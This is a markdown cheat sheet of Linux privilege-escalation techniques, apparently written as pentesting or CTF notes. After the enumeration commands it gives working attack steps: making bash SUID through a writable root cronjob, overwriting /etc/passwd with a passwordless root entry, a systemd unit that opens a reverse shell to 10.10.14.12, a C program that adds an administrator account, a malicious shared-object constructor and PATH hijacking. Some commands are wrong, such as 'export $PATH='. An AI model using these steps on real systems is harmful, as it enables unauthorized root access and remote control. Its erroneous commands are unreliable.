## Good Reads
```
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
https://github.com/janithmalinga/PayloadsAllTheThings
https://book.hacktricks.xyz/linux-unix/privilege-escalation
```
## Manual Enumeration

## Enumerate User Info

### Logged in user
```
id
whoami
pwd
```

### Find OS version
```
cat /etc/*-release
uname -a
lsb_release -a
```

### Other users
```
cat /etc/passwd
grep -vE "nologin|false" /etc/passwd
```
### curently running processes
```
ps aux
```
### What's installed
```
dpkg -l (Debian based OSs)
rpm -qa (CentOS / openSUSE )
uname -a
```

## Enumerate Network

### Find IP and associated IPs
```
ifconfig
ip a
```

### Open Ports
```
netstat -ano
```

## In privilage escalation we need to find answers first to below questions
```
What user files do we have access to?
What configurations do we have access to?
Any incorrect file permissions?
What programs are custom? Any SUID? SGID?
What's scheduled to run?
Any hardcoded credentials? Where are credentials kept?
```

## Automated Enumeration
```
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh
https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py
```

## Exploiting scheduled tasks

### User editable cronjobs
```
crontab -l
cat /etc/crontab
```

### Application based cron jobs
```
ls -all /etc/cron.d
```
### if you find a cronjob running as root but can be editable run this command
```
chmod u+s /bin/bash
and then this,
/bin/bash -p
```

### Writable /etc/passwd file found
```
“root::0:0:root:/root:/bin/bash” > /etc/passwd
```

### Try dirty cow exploit
```
https://github.com/FireFart/dirtycow/blob/master/dirty.c
```

## SUID checker
```
find / -type f -perm -04000 -ls 2> /dev/null
find / \( -perm -4000 \) -exec ls -ld {} \; 2>/dev/null
```

### systemctl has SUID set
Create root.service file
```
[Unit]
Description=get root privilege

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.12/9999 0>&1'

[Install]
WantedBy=multi-user.target
```
Transfer it to CTF and runfollowing command
```
/bin/systemctl enable /home/pepper/root.service
```

### If it is possible to run a c executable, run useradd.c file
```
#include <stdlib.h> /* system, NULL, EXIT_FAILURE */

int main ()
{
  int i;
  i=system ("net user janith janith@123 /add && net localgroup administrators janith /add");
  return 0;
}
```

### If you found a shared object, create this c file to inject
```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

## Environment variable injection

### If you find a file without full path and having SIUD bit set, create this c file,
```
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
```

### Set environment path to /tmp
```
export $PATH=/tmp:$PATH
```

### crack shadow hash using john
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
